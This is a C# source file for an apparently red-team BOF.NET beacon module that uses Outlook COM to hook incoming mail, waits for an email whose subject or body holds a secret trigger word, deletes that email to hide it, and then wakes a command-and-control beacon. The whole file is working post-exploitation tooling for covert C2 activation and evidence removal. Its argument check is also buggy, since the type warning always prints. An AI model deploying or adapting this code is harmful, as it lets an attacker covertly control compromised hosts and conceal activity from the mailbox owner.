using BOFNET;
using Microsoft.Office.Interop.Outlook;
using System;
using System.Diagnostics;
using System.Threading;


namespace On_Demand_C2_BOF
{
    public class OnDemandC2Class : BeaconObject
    {
        public OnDemandC2Class(BeaconApi api) : base(api) { }

        Application app = null;
        string OnDemandC2Trigger;
        string OnDemandType;
        AutoResetEvent WaitForReply;
        _NameSpace ns = null;
        MAPIFolder inboxFolder = null;

        void outlookInit()
        {
            try
            {
                WaitForReply = new AutoResetEvent(false);
                app = new Application();
                ns = app.GetNamespace("MAPI");
                inboxFolder = ns.GetDefaultFolder(Microsoft.Office.Interop.Outlook.OlDefaultFolders.olFolderInbox);
            }
            catch (System.Exception Ex)
            {
                BeaconConsole.WriteLine($"Failed to initialize outlook COM: {Ex.Message}");
            }
        }

        public override void Go(string[] args)
        {
            int count = 0;
            foreach (var item in args)
            {
                BeaconConsole.WriteLine($"{count}: {item}");
                count++;
            }

            if (args.Length != 2)
            {
                BeaconConsole.WriteLine("wrong args.\r\n" +
                    "Parameters: bofnet_execute On_demand_c2_bof.OnDemandC2Class [subject || body] secret_word\r\n" +
                    "Example:  bofnet_execute On_demand_c2_bof.OnDemandC2Class subject quality");
                return;
            }

            if (args[0] != "subject" || args[0] != "body")
            {
                BeaconConsole.WriteLine("The monitoring type should be either subject or body.\r\nExample:  bofnet_execute On_demand_c2_bof.OnDemandC2Class subject quality");
            }
            outlookInit();
            
            BeaconConsole.WriteLine($"Creating Outlook COM objects succeeded.\r\nHooking to all emails with {args[0]} that contains {args[1]}");

            OnDemandC2(args[0], args[1]);
        }


         void OnDemandC2(string type, string triggerWord)
        {
            OnDemandC2Trigger = triggerWord;

            try
            {
                if (type == "subject")
                {
                    app.NewMailEx += OnDemandC2_Subject_Subscriber;

                }
                else if (type == "body")
                {
                    app.NewMailEx += OnDemandC2_Body_Subscriber;
                }
            }
            catch (System.Exception Ex)
            {
                BeaconConsole.WriteLine($"Error hooking to outlook events: {Ex.Message}");
            }
            //Wait for new messages
            WaitForReply.WaitOne();
        }

        private void OnDemandC2_Body_Subscriber(string EntryIDCollection)
        {
            MailItem newMail = (MailItem)app.Session.GetItemFromID(EntryIDCollection, System.Reflection.Missing.Value);
            //This is a cryptic way to get String.contains("") in case-insensitive way
            if (newMail.Body.IndexOf(OnDemandC2Trigger, StringComparison.OrdinalIgnoreCase) >= 0)
            {
                newMail.Delete();
                WaitForReply.Set();
            }
        }

        private void OnDemandC2_Subject_Subscriber(string EntryIDCollection)
        {
            MailItem newMail = (MailItem)app.Session.GetItemFromID(EntryIDCollection, System.Reflection.Missing.Value);
            //This is a cryptic way to get String.contains("") in case-insensitive way
            if (newMail.Subject.IndexOf(OnDemandC2Trigger, StringComparison.OrdinalIgnoreCase) >= 0)
            {
                newMail.Delete();
                WaitForReply.Set();
            }
        }


    }

}
